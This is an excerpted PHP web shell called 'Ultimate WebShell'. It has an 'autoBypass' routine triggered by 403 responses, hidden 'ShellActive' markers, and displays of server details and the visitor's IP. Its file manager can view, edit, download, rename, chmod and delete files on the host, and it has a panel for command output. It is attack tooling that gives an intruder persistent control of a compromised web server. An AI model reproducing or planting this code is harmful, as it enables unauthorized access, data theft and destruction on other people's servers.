...
function autoBypass() {
    ...
    if (http_response_code() == 403 || !isset($_SERVER['HTTP_HOST'])) {
...
// Force output to prevent blank page
if (ob_get_level() > 0) {
    ob_end_flush();
}
ob_start();

// Get document root with fallback
$r0 = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : getcwd();
...
// Get client IP
$client_ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        ...
        switch ($action) {
            case 'delete':
                if (is_dir($fullPath)) {
                    ...
                    if (unlink($fullPath)) $successCount++;
                }
                break;
...
<head>
    ...
    <title>WebShell - <?= htmlspecialchars($_SERVER['SERVER_NAME'] ?? 'Unknown') ?></title>
    <style>
...
<body class="bg-dark text-light">
    ...
    <div style="display:none;">
        ...
        <?php echo "<!-- ShellActive:" . md5(__FILE__) . " -->"; ?>
    </div>
        ...
        <div class="py-3">
            <div class="box shadow bg-dark p-4 rounded-3">
                    ...
                    <div class="col-md-8">
                        <div class="info">
                            ...
                            <small class="text-muted">
                                <i class="fa fa-server"></i> <?= php_uname() ?><br>
                                <i class="fa fa-microchip"></i> <?= htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') ?><br>
                                <i class="fa fa-satellite-dish"></i> Server: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']) ?><br>
                                <i class="fa fa-user"></i> Your IP: <?= htmlspecialchars($client_ip) ?>
                            </small>
                        </div>
                    </div>
                    ...
                    <nav aria-label="breadcrumb">
                        <ol class="breadcrumb">
                            <?php foreach ($exdir as $id => $pat): ?>
                                ...
                                <li class="breadcrumb-item <?= ($id === count($exdir) - 1) ? 'active text-secondary' : '' ?>">
                                    <?php if ($id === count($exdir) - 1): ?>
                                        <i class="fas fa-folder-open"></i> <?= htmlspecialchars($pat) ?>
                                    <?php else: ?>
                                        <a href="?dir=<?= urlencode(implode('/', array_slice($exdir, 0, $id + 1))) ?>" class="text-decoration-none text-light">
                                            <i class="fas fa-folder"></i> <?= htmlspecialchars($pat) ?>
                                        </a>
                                    <?php endif; ?>
                                </li>
                            <?php endforeach; ?>
                    ...
                    <div class="col-md-6">
                        ...
                        <?php if (!empty($command_output)): ?>
                            <div class="mt-2 p-3 bg-black rounded">
                                <pre class="text-light mb-0 small"><?= htmlspecialchars($command_output) ?></pre>
                            </div>
                        <?php endif; ?>
                    </div>
                    <div class="col-md-6">
                                ...
                                <?php if (!empty($all_items)): ?>
                                    <?php foreach ($all_items as $item): ?>
                                        <tr class="file-row">
                                            <td>
                                                <?php if ($item['name'] != '..'): ?>
                                                    <input type="checkbox" name="selected_files[]" value="<?= htmlspecialchars($item['name']) ?>" class="item-checkbox" onchange="toggleActionButtons()">
                                                <?php else: ?>
                                            ...
                                            <td>
                                                <?php if ($item['type'] == 'parent'): ?>
                                                    ...
                                                    <a href="?dir=<?= urlencode($item['path']) ?>" class="text-decoration-none text-light fw-bold">
                                                ...
                                                <?php else: ?>
                                                    ...
                                                    <a href="?dir=<?= urlencode($path) ?>&action=view&item=<?= urlencode($item['name']) ?>" class="text-decoration-none text-light">
                                                        <?= htmlspecialchars($item['name']) ?>
                                                    </a>
                                                <?php endif; ?>
                                            </td>
                                            ...
                                            <td>
                                                ...
                                                <?php elseif ($item['is_dir']): ?>
                                                    <div class="btn-group btn-group-sm">
                                                        <button type="button" class="btn btn-outline-warning btn-sm" onclick="showRenameModal('<?= htmlspecialchars($item['name']) ?>', 'folder')">
                                                            <i class="fas fa-edit"></i>
                                                        </button>
                                                        <button type="button" class="btn btn-outline-info btn-sm" onclick="showChmodModal('<?= htmlspecialchars($item['name']) ?>', '<?= $item['perms'] ?>')">
                                                            <i class="fas fa-key"></i>
                                                        </button>
                                                        <button type="button" class="btn btn-outline-danger btn-sm" onclick="confirmDelete('<?= htmlspecialchars($item['name']) ?>')">
                                                            <i class="fas fa-trash"></i>
                                                        </button>
                                                    </div>
                                                <?php else: ?>
                                                    <div class="btn-group btn-group-sm">
                                                        <a href="?download=1&dir=<?= urlencode($path) ?>&item=<?= urlencode($item['name']) ?>" class="btn btn-outline-success btn-sm" title="Download">
                                                            <i class="fas fa-download"></i>
                                                        </a>
                                                        <button type="button" class="btn btn-outline-warning btn-sm" onclick="showRenameModal('<?= htmlspecialchars($item['name']) ?>', 'file')">
                                                            <i class="fas fa-edit"></i>
                                                        </button>
                                                        <button type="button" class="btn btn-outline-info btn-sm" onclick="showChmodModal('<?= htmlspecialchars($item['name']) ?>', '<?= $item['perms'] ?>')">
                                                            <i class="fas fa-key"></i>
                ...
                <div class="text-muted small mt-4 text-center">
                    &#169; Ultimate WebShell <script>document.write(new Date().getFullYear())</script> | Anti-Blank Protection Enabled
                </div>
            </div>
        </div>
    </div>
    ...
    <div class="modal fade show" id="fileViewModal" tabindex="-1" style="display: block; background: rgba(0,0,0,0.8);">
        <div class="modal-dialog modal-xl">
            <div class="modal-content bg-dark text-light">
                <div class="modal-header">
                    <h5 class="modal-title"><i class="fas fa-edit"></i> Edit File: <?= htmlspecialchars($_GET['item']) ?></h5>
                    <a href="?dir=<?= urlencode($path) ?>" class="btn-close btn-close-white"></a>
                </div>
                <form method="post">
                    <div class="modal-body">
                        <input type="hidden" name="file_path" value="<?= htmlspecialchars($path . '/' . $_GET['item']) ?>">
                        <textarea class="form-control font-monospace" name="file_content" rows="20" style="background: #1a1a1a; color: #00ff00;"><?= $file_content ?></textarea>
                    </div>
                    <div class="modal-footer">
                        <a href="?dir=<?= urlencode($path) ?>" class="btn btn-secondary">Cancel</a>
...
Server IP: <?= $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['SERVER_NAME']) ?>
...
Anti-Blank: ACTIVE
    ...
    function confirmDelete(name) {
        Swal.fire({
            ...
            if (result.isConfirmed) {
                window.location.href = '?dir=<?= urlencode($path) ?>&action=delete&item=' + encodeURIComponent(name);
            }
        });
    }
    ...
    <div style="display:none;">
        <!-- Security Footer: <?= md5(__FILE__ . time()) ?> -->
    </div>
</body>
</html>
